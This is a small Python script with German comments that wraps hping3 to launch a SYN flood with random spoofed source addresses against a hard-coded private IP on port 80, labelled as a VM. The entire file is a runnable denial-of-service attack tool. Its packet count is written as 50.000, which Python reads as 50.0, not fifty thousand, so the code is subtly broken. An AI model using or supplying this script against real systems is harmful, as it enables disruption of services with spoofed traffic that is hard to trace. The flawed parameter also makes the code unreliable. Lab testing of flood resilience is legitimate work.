import os
import subprocess


def execute_hping(target_ip, target_port, packet_count, interface):
    print(f"Starte SYN-Flood gegen {target_ip}:{target_port} mit {packet_count} Paketen...")

    # Erstelle den hping3-Befehl
    command = [
        "hping3",
        "-S",  # SYN-Flag setzen
        "-p", str(target_port),  # Zielport
        "--flood",  # Flood-Modus für maximale Geschwindigkeit
        "--rand-source",  # Zufällige Quell-IP-Adressen
        target_ip
    ]

    # Interface hinzufügen, falls angegeben
    if interface:
        command.extend(["-I", interface])

    # Begrenze die Anzahl der Pakete, falls angegeben
    if packet_count > 0:
        command.extend(["-c", str(packet_count)])

    # Führe den Befehl aus
    try:
        subprocess.run(command, check=True)
    except FileNotFoundError:
        print("hping3 ist nicht installiert. Installiere es mit: sudo apt install hping3")
    except subprocess.CalledProcessError as e:
        print(f"Fehler beim Ausführen von hping3: {e}")
    except Exception as e:
        print(f"Ein unerwarteter Fehler ist aufgetreten: {e}")


if __name__ == "__main__":
    # Ziel-IP, Port und Anzahl Pakete festlegen
    target_ip = "192.168.0.179"  # VM IP
    target_port = 80  # Beispiel-Ziel-Port (HTTP)
    packet_count = 50.000
    interface = "enp0s3"  # Optional: Interface (z. B. "eth0" oder "wlan0")

    execute_hping(target_ip, target_port, packet_count, interface)
